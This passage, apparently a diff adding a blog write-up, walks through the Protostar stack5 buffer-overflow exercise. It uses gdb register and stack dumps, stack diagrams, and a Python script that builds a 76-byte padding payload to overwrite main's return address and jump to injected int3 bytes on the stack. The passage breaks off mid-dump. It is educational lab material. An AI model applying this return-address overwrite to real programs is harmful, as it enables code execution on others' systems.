+0x080483d9 &amp;lt;main+21&amp;gt;:	leave  
+0x080483da &amp;lt;main+22&amp;gt;:	ret    
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info registers
+eax            0xbffff760	&lt;span class=&quot;nt&quot;&gt;-1073744032&lt;/span&gt;
+ecx            0x5d53dbb4	1565776820
+edx            0x1	1
+ebx            0xb7fd7ff4	&lt;span class=&quot;nt&quot;&gt;-1208123404&lt;/span&gt;
+esp            0xbffff750	0xbffff750
+ebp            0xbffff7a8	0xbffff7a8
+esi            0x0	0
+edi            0x0	0
+eip            0x80483d4	0x80483d4 &amp;lt;main+16&amp;gt;
+eflags         0x200286	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; PF SF IF ID &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/20x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xb7fd7ff4	0x0804958c	0xbffff778	0x080482c4
+0xbffff770:	0xb7ff1040	0x0804958c	0xbffff7a8	0x08048409
+0xbffff780:	0xb7fd8304	0xb7fd7ff4	0x080483f0	0xbffff7a8
+0xbffff790:	0xb7ec6365	0xb7ff1040	0x080483fb	0xb7fd7ff4
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see above we are about to execute instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;&lt;/code&gt; our instruction pointer EIP also shows this as it has &lt;code class=&quot;highlighter-rouge&quot;&gt;0x80483d4&lt;/code&gt; as value. Let see what happens when we go into the function.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; si
+0x080482e8 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gets@plt &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info registers
+eax            0xbffff760	&lt;span class=&quot;nt&quot;&gt;-1073744032&lt;/span&gt;
+ecx            0x5d53dbb4	1565776820
+edx            0x1	1
+ebx            0xb7fd7ff4	&lt;span class=&quot;nt&quot;&gt;-1208123404&lt;/span&gt;
+esp            0xbffff74c	0xbffff74c
+ebp            0xbffff7a8	0xbffff7a8
+esi            0x0	0
+edi            0x0	0
+eip            0x80482e8	0x80482e8 &amp;lt;gets@plt&amp;gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; We are now going to the gets &lt;span class=&quot;k&quot;&gt;function
+&lt;/span&gt;eflags         0x200286	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; PF SF IF ID &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/20x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff74c:	0x080483d9	0xbffff760	0xb7ec6165	0xbffff768
+0xbffff75c:	0xb7eada75	0xb7fd7ff4	0x0804958c	0xbffff778
+0xbffff76c:	0x080482c4	0xb7ff1040	0x0804958c	0xbffff7a8
+0xbffff77c:	0x08048409	0xb7fd8304	0xb7fd7ff4	0x080483f0
+0xbffff78c:	0xbffff7a8	0xb7ec6365	0xb7ff1040	0x080483fb
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By executing &lt;em&gt;call&lt;/em&gt;, the program did two things, (#1) it jumped into the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function as showed by our instruction pointer EIP and (#2) it pushed &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483d9&lt;/code&gt; to our stack as well (which corresponds to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483d9 &amp;lt;main+21&amp;gt;:    leave &lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;Let’s continue stepping in:&lt;/p&gt;
+
+&lt;p&gt;Since we are calling into a dynamic library there will be some extra steps happening (loading the library and doing a lookup of the actual address of &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;), but finally we arrive into the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function which points to the&lt;code class=&quot;highlighter-rouge&quot;&gt;_IO_gets&lt;/code&gt; in the GLIBC_2.0 library:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; si
+0xb7ef3e46	39	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;iogets.c
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;_IO_gets:
+0xb7ef3e40 &amp;lt;_IO_gets+0&amp;gt;:	push   ebp
+0xb7ef3e41 &amp;lt;_IO_gets+1&amp;gt;:	mov    ebp,esp
+0xb7ef3e43 &amp;lt;_IO_gets+3&amp;gt;:	sub    esp,0x24
+0xb7ef3e46 &amp;lt;_IO_gets+6&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xc],ebx
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/12x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff724:	0xb7fd7ff4	0x00000000	0x00000000	0xbffff7a8
+0xbffff734:	0xb7ff6210	0x00000001	0xb7ef3e40	0xbffff760
+0xbffff744:	0xb7fff8f8	0xbffff7a8	0x080483d9	0xbffff760
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we enter the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function the program will (#3) push the base pointer of the current stack frame (main’s stack frame) into the stack, (#4) setting te current stack pointer as the base pointer and (#5) it will allocate 0x24 bytes in the stack.&lt;/p&gt;
+
+&lt;p&gt;As we can see in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;’s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;main+21&amp;gt;:    leave &lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Based on our stack representation, we have the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+--------------------+ 0x00000000
+|                    |
+| Unallocated        |
+| memory             |
+|                    |
+|                    |
+|                    |
++--------------------+---    -- Top of the stack (0xbffff724) --
+| Local variables    |  \
+| 0x24 bytes         |  \
++--------------------+  \ 
+| Previous EBP       |  \ &amp;lt;---  gets' Stack Frame
+| (0xbffff7a8)       |  \
++--------------------+  \
+| Return pointer     |  \
+| (0x080483d9)       |  \
++--------------------+---  -- Stack pointer before calling gets (0xbffff750) --
+| Local variables    |  \
+| 0x50 bytes         |  \
++--------------------+  \ 
+| Previous EBP       |  \ &amp;lt;---  mains' Stack Frame
+| (0xbffff828)       |  \
++--------------------+  \
+| Return pointer     |  \
+| (0xb7eadc76)       |  \
++--------------------+--- 0xbffff7b0
+| Previous Stack     |
+| Frame              |
+|                    |
++--------------------+ 0xFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Based on the previous statements, we can exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; vulnerability to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;’s return pointer and hijack the execution towards an address that we desire.&lt;/p&gt;
+
+&lt;p&gt;We know that the buffer passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; resides in 0xbffff750 + 0x10 (Remember &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; dissasemble):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; si
+0x080483d1	10	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+...
+0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,[esp+0x10]        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;0xbffff750 + 0x10
+0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff750:	0xb7fd7ff4 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; We care about the address not the value
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The stack would look something like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                +--------------------+ 0x00000000
+                |                    |
+                | Unallocated        |
+                | memory             |
+                |                    |
+                |                    |
+                |                    |
+             +-----------------------+ &amp;lt;------+ Top of the stack (0xbffff724)
+             |  | Local variables    |
+             |  | 0x24 bytes         |
+             |  +--------------------+
+             |  | Previous EBP       |
+ get's stack-&amp;gt;  | (0xbffff7a8)       |
+ frame       |  +--------------------+
+             |  | Return pointer     |
+             |  | (0x080483d9)       |
+             +-----------------------+ &amp;lt;------+ Stack pointer before calling gets (0xbffff750)
+             |  | Local variables    |
+             |  | 0x50 bytes         | &amp;lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+             |  +--------------------+ &amp;lt;------+ Main's EBP (0xbffff7a8)
+             |  | Previous EBP       |
+main's stack-&amp;gt;  | (0xbffff828)       |
+frame        |  +--------------------+ &amp;lt;------+ Main's Return Pointer (0xbffff7a8 +0x4)
+             |  | Return pointer     |
+             |  | (0xb7eadc76)       |
+             +-----------------------+ &amp;lt;------+ Stack pointer before calling main (0xbffff7b0)
+                | Previous Stack     |
+                | Frame              |
+                |                    |
+                +--------------------+ 0xFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The pointer passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; will be used to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;mains&lt;/code&gt;’s return pointer, like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                +--------------------+ 0x00000000
+                |                    |
+                | Unallocated        |
+                | memory             |
+                |                    |
+                |                    |
+                |                    |
+             +-----------------------+ &amp;lt;------+ Top of the stack (0xbffff724)
+             |  | Local variables    |
+             |  | 0x24 bytes         |
+             |  +--------------------+
+             |  | Previous EBP       |
+ get's stack-&amp;gt;  | (0xbffff7a8)       |
+ frame       |  +--------------------+
+             |  | Return pointer     |
+             |  | (0x080483d9)       |
+             +-----------------------+ &amp;lt;------+ Stack pointer before calling gets (0xbffff750)
+             |  |                    |
+             |  +--------------------+ &amp;lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+             |  |                    | &amp;lt;------+ Main's EBP (0xbffff7a8)
+             |  | [malicious input]  |
+main's stack-&amp;gt;  |                    |
+frame        |  +--------------------+ &amp;lt;------+ Main's Return Pointer (0xbffff7ac)
+             |  | [Overwritten       |
+             |  | return address]    |
+             +-----------------------+ &amp;lt;------+ Stack pointer before calling main (0xbffff7b0)
+                | Previous Stack     |
+                | Frame              |
+                |                    |
+                +--------------------+ 0xFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We know &lt;code class=&quot;highlighter-rouge&quot;&gt;mains&lt;/code&gt;’s EBP is 0xbffff7a8 (from the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;’ stack frame. A register in a 32bit architecture corresponds to 4 bytes. So &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer. The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+
+&lt;h4 id=&quot;taking-control-of-execution&quot;&gt;Taking control of execution&lt;/h4&gt;
+
+&lt;p&gt;Based on the previous section, it is known that to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;’s return pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; needs to read 80 bytes. This to overflow the local variable section, ebp section, and return pointer section of &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;’s stack frame.&lt;/p&gt;
+
+&lt;p&gt;To achieve that we need to pass a payload similar to this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;76 bytes + return address
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In order to do that, we can use the following python script. For now, the instruction pointer (return address) was set to 0x45454545:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xAA&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45454545&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A file can be generated by executing this python script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@protostar:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python payload.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;.txt
+user@protostar:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;.txt 
+����������������������������������������������������������������������������EEEE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s use the &lt;em&gt;in.txt&lt;/em&gt; as input to our program in GDB:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b main
+Breakpoint 6 at 0x80483cd: file stack5/stack5.c, line 10.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; ~/in.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A breakpoint in main was set so we can analyze how the stack is modified by the provided input. By analyzing the stack after the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function was executed we can see the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info registers
+...
+esp            0xbffff750	0xbffff750
+ebp            0xbffff7a8	0xbffff7a8
+...
+eip            0x80483d9	0x80483d9 &amp;lt;main+21&amp;gt;
+...
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+0x080483c4 &amp;lt;main+0&amp;gt;:	push   ebp
+0x080483c5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
+0x080483c7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
+0x080483ca &amp;lt;main+6&amp;gt;:	sub    esp,0x50
+0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,[esp+0x10]
+0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
+0x080483d9 &amp;lt;main+21&amp;gt;:	leave  
+0x080483da &amp;lt;main+22&amp;gt;:	ret    
+End of assembler dump.
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/30x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# Main's stack frame&lt;/span&gt;
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff770:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff780:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff790:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff7a0:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0x45454545
+0xbffff7b0:	0x00000000	0xbffff854	0xbffff85c	0xb7fe1848
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x 0xbffff7ac        &lt;span class=&quot;c&quot;&gt;# IP/Return pointer address&lt;/span&gt;
+0xbffff7ac:	0x45454545 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From above it is possible to observe that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack.&lt;/p&gt;
+
+&lt;p&gt;Payload will be updated to accommodate instructions to be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                               +--------------------+ 0x00000000
+                               |                    |
+                               | Unallocated        |
+                               | memory             |
+                               |                    |
+                               |                    |
+                               |                    |
+                            +-----------------------+ &amp;lt;------+ Top of the stack (0xbffff724)
+                            |  | Local variables    |
+                            |  | 0x24 bytes         |
+                            |  +--------------------+
+                            |  | Previous EBP       |
+                get's stack+&amp;gt;  | (0xbffff7a8)       |
+                frame       |  +--------------------+
+                            |  | Return pointer     |
+                            |  | (0x080483d9)       |
+                            +-----------------------+ &amp;lt;------+ Stack pointer before calling gets (0xbffff750)
+                            |  |                    |
+           +----------------------------------------+ &amp;lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+           |                |  |                    | &amp;lt;------+ Main's EBP (0xbffff7a8)
+           |                |  | [Padding]          |
+           |   main's stack+&amp;gt;  |                    |
+           |   frame        |  +--------------------+ &amp;lt;------+ Main's Return Pointer (0xbffff7ac)
+Injected---&amp;gt;                |  | [Overwritten       |
+payload    |                |  | return address]    |
+           |                +-----------------------+ &amp;lt;------+ Stack pointer before calling main (0xbffff7b0)
+           |                   | [Injected          |
+           |                   | instructions]      |
+           |                   |                    |
+           +-------------------+--------------------+ 0xFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Initially only an &lt;code class=&quot;highlighter-rouge&quot;&gt;int 3&lt;/code&gt; instruction will be written to prove this concept.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;int3&lt;/code&gt; is an instruction used to indicate a debug break. This means gdb will break when this instruction is executed. The opcode for &lt;code class=&quot;highlighter-rouge&quot;&gt;int3&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0xCC&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The python script will be updated to reflect this:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xAA&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbffff7b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;instructions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xCC&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instructions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By passing this input to gdb, and analyzing the stack just before ret gets called, it is possible to observe how the stack was changed:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; ~/in.txt
+Breakpoint 7, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-858993460&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffff800&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack5/stack5.c:11
+11	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+0x080483c4 &amp;lt;main+0&amp;gt;:	push   ebp
+0x080483c5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
+0x080483c7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
+0x080483ca &amp;lt;main+6&amp;gt;:	sub    esp,0x50
+0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,[esp+0x10]
+0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
+0x080483d9 &amp;lt;main+21&amp;gt;:	leave  
+0x080483da &amp;lt;main+22&amp;gt;:	ret    
+End of assembler dump.
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/30x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt; 
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
